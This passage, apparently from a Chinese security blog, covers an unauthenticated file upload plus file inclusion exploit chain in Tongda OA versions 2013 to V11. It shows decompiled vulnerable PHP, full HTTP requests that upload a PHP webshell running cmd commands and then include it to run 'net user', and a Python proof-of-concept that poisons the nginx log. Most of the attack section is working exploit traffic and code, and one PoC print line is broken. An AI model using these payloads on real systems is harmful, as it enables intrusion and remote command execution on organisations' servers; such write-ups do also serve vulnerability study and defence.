<li>文件上传地址：<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9pc3Bpcml0L2ltL3VwbG9hZC5waHA=">http://localhost/ispirit/im/upload.php<i class="fa fa-external-link-alt"></i></span></li>
<li>本地文件包含地址（根据版本不同而不同）<ul>
<li>地址一：<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9pc3Bpcml0L2ludGVyZmFjZS9nYXRld2F5LnBocCVFRiVCQyU4ODIwMTMlRUYlQkMlODk=">http://localhost/ispirit/interface/gateway.php（2013）<i class="fa fa-external-link-alt"></i></span></li>
<li>地址二：<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9tYWMvZ2F0ZXdheS5waHAlRUYlQkMlODgyMDE3JUVGJUJDJTg5">http://localhost/mac/gateway.php（2017）<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
</ul>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>部分版本可能没有安装某插件而无法利用。</p>
<ul>
<li>tongdaOA V11</li>
<li>tangdaOA 2017</li>
<li>tangdaOA 2016</li>
<li>tangdaOA 2015</li>
<li>tangdaOA 2013 增强版</li>
<li>tangdaOA 2013</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>代码是经过Zend加密的，解密即可。</p>
<ul>
<li>在文件<code>ispirit\im\upload.php</code>中的登录验证部分，在文件中第一个IF（6行），只要设置了参数P就可以绕过。</li>
<li>然后就是需要传一个DEST_UID参数（22行）来过exit，只要不为0或空的数字都可以。然后就可以走到upload函数了，接下来如果<code>$UPLOAD_MODE == &#39;1&#39;</code>就会把<code>ATTACHMENT_ID</code>输出出来，这个id其实就是我们马的文件名。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//decode by http://dezend.qiling.org  QQ 2859470</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">&#x27;P&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;inc/session.php&#x27;</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;./auth.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/utility_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/utility_msg.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;mobile/inc/funcs.php&#x27;</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">&#x27;TYPE&#x27;</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">&#x27;DEST_UID&#x27;</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">&#x27;&#x27;</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;接收方ID无效&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">&#x27;,&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;接收方ID无效&#x27;</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">&#x27;im&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) != strlen($_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] = urldecode($_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">&#x27;ATTACHMENT&#x27;</span>, $MODULE, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">&#x27;ID&#x27;</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">&#x27;NAME&#x27;</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">&#x27;mobile&#x27;</span>) &#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">&#x27;utf-8&#x27;</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;无文件上传&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;文件上传失败&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">&#x27;thumb_&#x27;</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">&#x27;MSG_CATE&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">&#x27;file&#x27;</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">&#x27;[fm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $FILE_SIZE . <span class="string">&#x27;[/fm]&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">&#x27;image&#x27;</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">&#x27;[im]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $FILE_SIZE . <span class="string">&#x27;[/im]&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">&#x27;[vm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $DURATION . <span class="string">&#x27;[/vm]&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">&#x27;@&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="literal">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">&#x27;INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (&#x27;</span><span class="string">&#x27; . date(&#x27;</span>Y-m-d H:i:s<span class="string">&#x27;) . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $_SESSION[&#x27;</span>LOGIN_UID<span class="string">&#x27;] . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $DEST_UID . &#x27;</span><span class="string">&#x27;,&#x27;</span>*<span class="string">&#x27; . $ATTACHMENT_ID . &#x27;</span>.<span class="string">&#x27; . $ATTACHMENT_NAME . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $FILE_SIZE . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $AID . &#x27;</span><span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="literal">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;数据库操作失败&#x27;</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;content&#x27;</span> =&gt; $CONTENT, <span class="string">&#x27;file_id&#x27;</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">&#x27;DURATION&#x27;</span>]);</span><br><span class="line">        $CONTENT = <span class="string">&#x27;[vm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $DURATION . <span class="string">&#x27;[/vm]&#x27;</span>;</span><br><span class="line">        $query = <span class="string">&#x27;INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (&#x27;</span><span class="string">&#x27; . $_SESSION[&#x27;</span>LOGIN_UID<span class="string">&#x27;] . &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27; . $CONTENT . &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27; . time() . &#x27;</span><span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;+OK &#x27;</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">&#x27;thumb_&#x27;</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;+OK &#x27;</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">&#x27;[fm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $FILE_SIZE . <span class="string">&#x27;[/fm]&#x27;</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">&#x27;LOGIN_UID&#x27;</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">&#x27;&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">&#x27;insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (&#x27;</span><span class="string">&#x27; . date(&#x27;</span>Y-m-d H:i:s<span class="string">&#x27;) . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $_SESSION[&#x27;</span>LOGIN_UID<span class="string">&#x27;] . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $DEST_UID . &#x27;</span><span class="string">&#x27;,&#x27;</span>*<span class="string">&#x27; . $ATTACHMENT_ID . &#x27;</span>.<span class="string">&#x27; . $ATTACHMENT_NAME . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $FILE_SIZE . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;数据库操作失败&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;数据库操作失败2&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;+OK ,&#x27;</span> . $FILE_ID . <span class="string">&#x27;,&#x27;</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>不传P参数（7行）就能绕过exit了，然后走到下面的include_once进行文件包含。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/session.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/utility_org.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[^a-z0-9;]+/i&#x27;</span>, $P)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">&#x27;非法参数&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;LOGIN_USER_ID&#x27;</span>] == <span class="string">&#x27;&#x27;</span> || $_SESSION[<span class="string">&#x27;LOGIN_UID&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">&#x27;RELOGIN&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">    $json = stripcslashes($json);</span><br><span class="line">    $json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line">    <span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">&#x27;data&#x27;</span>) &#123;</span><br><span class="line">            $val = (<span class="keyword">array</span>) $val;</span><br><span class="line">            <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">&#x27;url&#x27;</span>) &#123;</span><br><span class="line">            $url = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($url != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            $url = substr($url, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include_once</span> $url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>摘抄自：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXV5YW4tc2VjL3AvMTI1NDkyMzcuaHRtbA==">https://www.cnblogs.com/yuyan-sec/p/12549237.html<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h3><p><strong>Request：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/1.1</span><br><span class="line">Host: 192.168.95.129</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://192.168.95.129/logincheck.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=gb4tpaqrsagb3fcmpu9sco48m5; KEY_RANDOMDATA=13319</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1673801018</span><br><span class="line">Content-Length: 558</span><br><span class="line"></span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;P&quot;</span></span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;DEST_UID&quot;</span></span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;ATTACHMENT&quot;</span>; filename=<span class="string">&quot;jpg&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = new COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="built_in">exec</span>(<span class="string">&quot;cmd /c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">?&gt;</span><br><span class="line">----------1673801018--</span><br></pre></td></tr></table></figure>

<p><strong>Response：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 22 Mar 2020 14:03:32 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Set-Cookie: PHPSESSID=123; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 37</span><br><span class="line"></span><br><span class="line">+OK [vm]252@2003_225735032|jpg|0[/vm]</span><br></pre></td></tr></table></figure>

<h3 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h3><p><strong>Request：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 192.168.95.129</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://192.168.95.129/logincheck.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=gb4tpaqrsagb3fcmpu9sco48m5; KEY_RANDOMDATA=13319</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 71</span><br><span class="line"></span><br><span class="line">json=&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;/general/../../attach/im/2003/225735032.jpg&quot;</span>&#125;&amp;cmd=net user</span><br></pre></td></tr></table></figure>

<p><strong>Response：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 22 Mar 2020 14:06:54 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\ 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    </span><br><span class="line">命令运行完毕，但发现一个或多个错误。</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>实际测试过程中可以通过包含nginx日志文件来实现快速探测是否存在改漏洞。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通达OA任意文件包含</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>(<span class="params">url</span>):</span></span><br><span class="line">	exp1 = <span class="string">&quot;/ispirit/interface/gateway.php?json=\&#123;\&#125;&amp;aa=&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;biubiubiu_testcc&#x27;);?&quot;</span></span><br><span class="line">	exp2 = <span class="string">&quot;/ispirit/interface/gateway.php&quot;</span></span><br><span class="line"></span><br><span class="line">	exp3 = <span class="string">&quot;/mac/gateway.php?json=\&#123;\&#125;&amp;aa=&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;biubiubiu_testcc&#x27;);?&quot;</span></span><br><span class="line">	exp4 = <span class="string">&quot;/mac/gateway.php&quot;</span></span><br><span class="line"></span><br><span class="line">	data = &#123;<span class="string">&quot;json&quot;</span>:<span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;/general/../../nginx/logs/oa.access.log\&quot;&#125;&quot;</span>&#125;</span><br><span class="line">	response1 = requests.get(url+exp1,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	response2 = requests.post(url+exp2,data=data,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	response3 = requests.get(url+exp3,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	response4 = requests.post(url+exp4,data=data,timeout=<span class="number">2</span>,verify=<span class="literal">False</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;biubiubiu_testcc&#x27;</span> <span class="keyword">in</span> response2.text <span class="keyword">or</span> <span class="string">&#x27;biubiubiu_testcc&#x27;</span> <span class="keyword">in</span> response4.text:</span><br><span class="line">		print(<span class="string">&#x27;[+]存在该漏洞:&#x27;</span>+)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">&#x27;[-]目标不存在该漏洞&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	args = sys.argv[<span class="number">1</span>]</span><br><span class="line">	get_one(args)</span><br></pre></td></tr></table></figure>

<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>两个版本均测试，执行命令OR写入SHELL。</p>
